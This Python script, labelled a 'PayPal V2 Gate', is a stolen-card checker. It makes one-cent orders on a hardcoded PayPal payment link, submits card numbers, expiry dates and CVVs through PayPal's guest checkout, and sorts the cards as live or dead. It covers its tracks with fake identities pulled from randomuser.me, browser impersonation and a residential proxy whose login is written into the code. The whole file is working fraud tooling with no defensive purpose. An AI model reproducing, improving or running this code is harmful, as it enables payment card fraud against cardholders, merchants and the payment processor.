#!/usr/bin/env python3
"""
PayPal V2 Gate - Variable Price Payment Link Checker
"""

import requests
import random
import re
import json
import time
from curl_cffi import requests as req

class Knight:
    @staticmethod
    def fakeData(iso: str = "us") -> object:
        class fakeData:
            def __init__(self, array: dict) -> None:
                for key, value in array.items():
                    setattr(self, key, value)

        try:
            a = requests.get(url=f"https://randomuser.me/api?nat={iso.lower()}", timeout=10).json()['results'][0]
            return fakeData({
                'status': True,
                'f_name': a['name']['first'],
                'l_name': a['name']['last'],
                'gender': a['gender'],
                'username': f"{a['name']['first']}{a['name']['last']}{str(random.randint(0, 999)).zfill(3)}",
                'phone': a['phone'],
                'mail': f"{a['name']['first']}{random.choice(['.', '_', '-'])}{a['name']['last']}{str(random.randint(0, 999))}@{random.choice(['gmail.com', 'outlook.com'])}",
                'country': a['location']['country'],
                'state': a['location']['state'],
                'city': a['location']['city'],
                'street': f"{a['location']['street']['number']} {a['location']['street']['name']}",
                'postcode': str(a['location']['postcode'])
            })
        except:
            return fakeData({
                'status': True,
                'f_name': 'John',
                'l_name': 'Smith',
                'phone': '212-555-0123',
                'mail': f"john.smith{random.randint(100, 999)}@gmail.com",
                'street': '123 Main St',
                'postcode': '10017'
            })

    @staticmethod
    def capture(string: str, init: str, offset: str) -> str:
        try:
            return string.split(init)[1].split(offset)[0]
        except:
            return ""

    @staticmethod
    def getCardType(cc: str) -> str:
        tipos = {'3': 'AMEX', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}
        return tipos.get(cc[0], 'VISA')


def check_ppv(cc: str, mm: str, yy: str, cvv: str, retries: int = 0, use_proxy: bool = True) -> dict:
    """Check card using PayPal Variable Price gate"""
    
    data = Knight.fakeData("us")
    model = req.Session(impersonate=random.choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
    
    if use_proxy:
        # FloppyData SOCKS5 Proxy
        tcp = 'user-P9tQgwy5zruWwzMa-country-US-type-residential-session-7ifkp24u-city-New_York:3RpmDKUKGSdqJFJu@geo.g-w.info:10800'
        model.proxies = {"http": f"socks5://{tcp}", "https": f"socks5://{tcp}"} if tcp else None
    else:
        model.proxies = None
    
    mm = mm.zfill(2)
    yy = yy if len(yy) == 4 else '20' + yy

    try:
        link_id = "KEMBSDPAJQAFE"
        merchant_id = "MU45K9TVBQUEW"
        
        headers1 = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }
        request1 = model.get(url=f"https://www.paypal.com/ncp/payment/{link_id}", headers=headers1, timeout=30)
        
        csrf_token = Knight.capture(request1.text, '"csrfToken":"', '"')
        if csrf_token:
            csrf_token = csrf_token.replace('\\u002F', '/')
        
        time.sleep(0.5)
        
        headers2 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://www.paypal.com",
            "referer": f"https://www.paypal.com/ncp/payment/{link_id}",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "x-csrf-token": csrf_token if csrf_token else ""
        }
        
        data2 = {
            "link_id": link_id,
            "merchant_id": merchant_id,
            "quantity": "1",
            "amount": "0.01",
            "button_type": "VARIABLE_PRICE",
            "currency": "USD",
            "currencySymbol": "$",
            "funding_source": "CARD",
            "csrfRetryEnabled": True
        }
        
        request2 = model.post(url="https://www.paypal.com/ncp/api/create-order", headers=headers2, json=data2, timeout=30)
        
        order_token = None
        try:
            response2 = request2.json()
            order_token = response2.get("context_id")
        except:
            pass
        
        if not order_token:
            return {'status': False, 'response': 'Could not create order', 'result': 'ERROR'}
        
        time.sleep(0.5)
        
        headers3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://www.paypal.com",
            "referer": f"https://www.paypal.com/ncp/payment/{link_id}",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "x-app-name": "standardcardfields",
            "x-country": "US",
            "paypal-client-context": order_token,
            "paypal-client-metadata-id": order_token
        }
        
        query3 = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """
        
        data3 = {
            "query": query3,
            "variables": {
                "token": order_token,
                "card": {
                    "cardNumber": cc,
                    "type": Knight.getCardType(cc),
                    "expirationDate": f"{mm}/{yy}",
                    "postalCode": "10017",
                    "securityCode": cvv
                },
                "phoneNumber": data.phone,
                "firstName": data.f_name,
                "lastName": data.l_name,
                "billingAddress": {
                    "givenName": data.f_name,
                    "familyName": data.l_name,
                    "line1": data.street,
                    "line2": None,
                    "city": "New York",
                    "state": "NY",
                    "postalCode": "10017",
                    "country": "US"
                },
                "shippingAddress": {
                    "givenName": data.f_name,
                    "familyName": data.l_name,
                    "line1": data.street,
                    "line2": None,
                    "city": "New York",
                    "state": "NY",
                    "postalCode": "10017",
                    "country": "US"
                },
                "email": data.mail,
                "currencyConversionType": "PAYPAL"
            },
            "operationName": None
        }
        
        request3 = model.post(url="https://www.paypal.com/graphql?fetch_credit_form_submit", headers=headers3, json=data3, timeout=30)
        response3 = request3.json()
        
        lives = [
            "is3DSecureRequired",
            "3D Secure Required",
            "APPROVED",
            "CHARGED",
            "live",
            "success",
            "1000",
            "00"
        ]
        
        if "errors" in response3 and response3["errors"]:
            error_msg = response3["errors"][0]
            
            if "data" in error_msg and error_msg["data"]:
                if isinstance(error_msg["data"], list) and len(error_msg["data"]) > 0:
                    field_error = error_msg["data"][0]
                    code = field_error.get("code", "")
                    respuesta = code
                elif isinstance(error_msg["data"], dict):
                    code = error_msg["data"].get("error", "")
                    respuesta = code if code else error_msg.get("message", "Unknown error")
                else:
                    respuesta = error_msg.get("message", "Unknown error")
            else:
                respuesta = error_msg.get("message", "Unknown error")
                
        elif response3.get("data", {}).get("approveGuestPaymentWithCreditCard"):
            approve_data = response3["data"]["approveGuestPaymentWithCreditCard"]
            flags = approve_data.get("flags", {})
            
            if flags.get("is3DSecureRequired"):
                respuesta = "3D Secure Required"
            else:
                respuesta = "Approved"
        else:
            respuesta = "Unknown Response"
        
        if any(live_code in respuesta for live_code in lives):
            status = "LIVE"
        elif "Approved" in respuesta:
            status = "CHARGED"
        elif "INVALID_RESOURCE_ID" in respuesta:
            status = "RETRY"
            respuesta = "Invalid Token"
        else:
            status = "DEAD"
        
        return {'status': True, 'response': respuesta, 'result': status}

    except Exception as error:
        if retries < 2:
            time.sleep(2)
            return check_ppv(cc, mm, yy, cvv, retries + 1)
        else:
            return {'status': False, 'response': f'Error: {str(error)[:50]}', 'result': 'ERROR'}


def parse_card(card_str: str) -> tuple:
    """Parse card string into components"""
    separators = ['|', '/', ' ']
    for sep in separators:
        if sep in card_str:
            parts = card_str.split(sep)
            if len(parts) >= 4:
                return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    return None, None, None, None
